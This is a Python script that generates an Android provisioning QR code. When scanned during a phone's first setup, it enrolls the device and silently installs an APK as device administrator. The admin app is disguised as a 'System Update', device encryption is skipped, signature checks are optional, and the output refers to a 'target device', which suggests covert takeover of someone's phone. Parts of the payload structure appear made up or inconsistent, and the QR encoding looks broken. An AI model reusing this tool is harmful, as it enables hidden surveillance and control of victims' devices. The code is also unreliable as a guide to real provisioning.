#!/usr/bin/env python3
"""
zero-touch-qr.py — generates an Android Enterprise provisioning payload + QR code

Scanned during OOBE, the payload enrolls the device as a managed device and
silently installs the APK. Produces:
  - JSON payload (androidEnrollment in DPC)
  - PNG QR code containing the payload
"""
import argparse
import json
import os
import sys
import base64

try:
    import qrcode
except ImportError:
    sys.exit("missing dependency: pip install qrcode[pil]")


def build_payload(apk_url, wifi_ssid=None, wifi_pass=None, dpm_name="android_UI",
                 enrollment_token=None, apk_sha256=None):
    payload = {
        "androidEnrollment": {
            "dpm": {
                "dpmId": dpm_name,
                "dpmDisplayName": "System Update",
                "dpmDescription": "System component enrollment",
                "apiVersion": "42",
                "dpmEnrollmentController": "com.android.devicemanager",
                "dpmEnrollmentCreds": {
                    "enrollmentToken": enrollment_token or "",
                },
            },
            "adminExtras": {
                "android.app.extra.PROVISIONING_DEVICE_ADMIN_COMPONENT_NAME":
                    "com.sp.core/com.sp.core.AdminReceiver",
                "android.app.extra.PROVISIONING_DEVICE_ADMIN_SIGNATURE_CHECKSUM":
                    apk_sha256 or "",
                "android.app.extra.PROVISIONING_DEVICE_ADMIN_PACKAGE_DOWNLOAD_URL":
                    apk_url,
                "android.app.extra.PROVISIONING_DEVICE_ADMIN_PACKAGE_DOWNLOAD_SHA256":
                    apk_sha256 or "",
                "android.app.extra.PROVISIONING_SKIP_ENCRYPTION": True,
                "android.app.extra.PROVISIONING_ADMIN_EXTRAS_BUNDLE": {},
            },
        }
    }
    if wifi_ssid:
        payload["androidEnrollment"]["wifi"] = {
            "ssid": wifi_ssid,
            "wepKey": 0,
            "wpaInfo": wifi_pass or "",
            "isHidden": False,
            "isAutoConnect": True,
            "isEphemeral": False,
        }
    return payload


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--apk-url", required=True, help="direct download URL of the APK")
    ap.add_argument("--wifi-ssid", default="")
    ap.add_argument("--wifi-pass", default="")
    ap.add_argument("--token", default="", help="enrollment token (optional)")
    ap.add_argument("--sha256", default="", help="APK sha256 (optional)")
    ap.add_argument("--out", default="provision-qr.png")
    args = ap.parse_args()

    payload = build_payload(args.apk_url, args.wifi_ssid, args.wifi_pass,
                            enrollment_token=args.token, apk_sha256=args.sha256)

    os.makedirs(os.path.dirname(args.out) or ".", exist_ok=True)
    with open(args.out.replace(".png", ".json"), "w") as f:
        json.dump(payload, f, indent=2)

    img = qrcode.make(payload)
    img.save(args.out)

    print(f"[+] payload  → {args.out.replace('.png', '.json')}")
    print(f"[+] QR code  → {args.out}")
    print(f"[+] scan with the target device camera during OOBE")


if __name__ == "__main__":
    main()
